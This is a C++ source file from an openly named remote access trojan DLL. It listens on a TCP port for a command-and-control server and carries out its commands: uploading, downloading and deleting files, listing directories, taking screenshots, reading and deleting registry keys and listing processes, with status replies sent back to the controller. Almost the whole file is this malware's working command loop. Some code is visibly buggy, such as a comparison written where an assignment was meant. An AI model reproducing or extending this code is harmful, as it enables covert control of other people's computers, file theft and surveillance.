// Patrick Sacchet (@pjsacchet)
// Verison 1.0
// RAT-Dll-Connect.cpp : This file contains functionality for handling our connection back to our C2 server

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-GetFile.h"
#include "RAT-Dll-PutFile.h"
#include "RAT-Dll-DirList.h"
#include "RAT-Dll-DeleteFile.h"
#include "RAT-Dll-Screenshot.h"
#include "RAT-Dll-Registry.h"
#include "RAT-Dll-Process.h"


int size = sizeof(IMAGE_SECTION_HEADER);

/** This function will serve as our main 'handler' for C2 requests
*       It will continously serve our server connection until the connection is closed, reading request types and responding to them as needed
params: 
* N/A
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT startListen()
{
    WORD wsaVersion;
    WSADATA wsaData;
    SOCKET clientSock, serverSock;
    SOCKADDR_IN client;
    INT status = SUCCESS;
    INT sendStatus = 0;
    INT recvBufLen = DEFAULT_BUF_LEN;
    INT bOptLen = sizeof(BOOL);
    BOOL bOptVal = FALSE;
    CHAR recvBuf[DEFAULT_BUF_LEN];
    CHAR msgBuf[DEFAULT_BUF_LEN];

    wsaVersion = MAKEWORD(2, 2);

    if (WSAStartup(wsaVersion, &wsaData))
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed WSAStartup! Error code %u\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    OutputDebugStringA("RAT-Dll-Connect::startListen - WSAStartup was successful! \n");

    // Information for target
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);

    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    clientSock = INVALID_SOCKET;

    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to create socket! \n");
        status = WSAGetLastError();
        goto cleanup;
    }

    status = bind(serverSock, (LPSOCKADDR)&client, sizeof(client));
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to bind to socket! \n");
        status = WSAGetLastError();
        goto cleanup;
     }

    // Set keepalive for our server socket
    status == setsockopt(serverSock, SOL_SOCKET, SO_KEEPALIVE, (char*)bOptVal, bOptLen);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Failed to set keepalive options! \n");
        status = WSAGetLastError();
        goto cleanup;
    }
        
    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Listening on port %u\n", PORT_NUM);
    OutputDebugStringA(msgBuf);

    status = listen(serverSock, SOMAXCONN);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Socket error ! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    clientSock = accept(serverSock, NULL, NULL);
    if (clientSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Connect::startListen - Invalid socket from client! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    // Close server socket since we no longer need it 
    closesocket(serverSock);

    // Receive from client until the peer shuts down the connection
        // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
        // TODO: Separate each conditional into its own function... probably in its respective cpp file. Have master handler in another function in this cpp file 
    do
    {
        OutputDebugStringA("RAT-Dll::startListen - Connection from C2 recieved! Waiting for command... \n");
        status = recv(clientSock, recvBuf, recvBufLen, 0);
        if (status > 0)
        {
            // C2 told us to put a file so lets get the file path first 
            if (strcmp((const char*)&recvBuf, PUT) == 0)
            {
                status = handlePutFile(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handlePutFile %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll::startListen - Successfully performed put file! \n");
            }

            // C2 told us to get a file so lets get the file path first 
            else if (strcmp((const char*)&recvBuf, GET) == 0)
             {
                status = handleGetFile(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleGetFile %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                } 
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed get file!\n");
             }

            // C2 says to do a dir list for specific directory 
            else if (strcmp((const char*)&recvBuf, DIR) == 0)
             {
                status = handleDirList(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleDirList %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed dir list!\n");
             }

            // C2 says to delete a file from a specific path 
            else if (strcmp((const char*)&recvBuf, DEL) == 0)
            {
                status = handleDeleteFile(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleDeleteFile %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed delete file!\n");
            }

            // C2 says to take a screenshot 
            else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
            {
                status = handleScreenshot(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleScreenshot %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed screenshot!\n");
            }

            // C2 says to read a registry key 
            else if (strcmp((const char*)&recvBuf, REGREAD) == 0)
            {
                status = handleRegRead(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegRead %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry read!\n");
            }

            // C2 says to delete a registry key or value 
            else if (strcmp((const char*)&recvBuf, REGDELETE) == 0)
            {
                status = handleRegDelete(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegDelete %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry delete!\n");
            }

            // C2 says to read a registry key 
            else if (strcmp((const char*)&recvBuf, PROCESSLIST) == 0)
            {
                status = handleProcessList(clientSock);
                if (status != SUCCESS)
                {
                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleProcessList %d\n", status);
                    OutputDebugStringA(msgBuf);
                    goto cleanup;
                }
                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed process list!\n");
            }
        }

        // We didn't receive any bytes for some reason so try again...
        else if (status == 0)
        {
            OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (command); attempting to recv again...\n");
        }

        // Weird error code; time to bail (technically this is covered by what's below? should remove this probably...)
        else
        {
            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from recv %d\n", WSAGetLastError());
            OutputDebugStringA(msgBuf);
            closesocket(clientSock);
            WSACleanup();
            return FALSE;
        }

    } while (status > 0);

    OutputDebugStringA("RAT-Dll::startListen - status < 0 so we're exiting...\n");

    // Shutdown connection since we're done
    status = shutdown(clientSock, SD_SEND);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from shutdown %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        closesocket(clientSock);
        WSACleanup();
        return FALSE;
    }

    closesocket(clientSock);
    WSACleanup();


cleanup:
    return status;
}


/** Helper function to send a SUCCESS status code to our C2
params:
* clientSock - current socket connection with our C2
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT sendSuccess(SOCKET clientSock)
{
    INT status = SUCCESS;
    CHAR msgBuf[DEFAULT_BUF_LEN];

    status = send(clientSock, "SUCCESS", 7, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::sendSuccess - Failure recevied from send (status code) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        status = WSAGetLastError();
        goto cleanup;
    }

    // Send returns number of bytes so make sure we return the actual success code
    status = SUCCESS;

cleanup:
    return status;
}


/** Helper function to send a FAILURE status code to our C2
params:
* clientSock - current socket connection with our C2
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT sendFailure(SOCKET clientSock)
{
    INT status = SUCCESS;
    CHAR msgBuf[DEFAULT_BUF_LEN];

    status = send(clientSock, "FAILURE", 7, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-Connect::sendFailure - Failure recevied from send (status code) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        status = WSAGetLastError();
        goto cleanup;
    }

cleanup:
    return status;

}
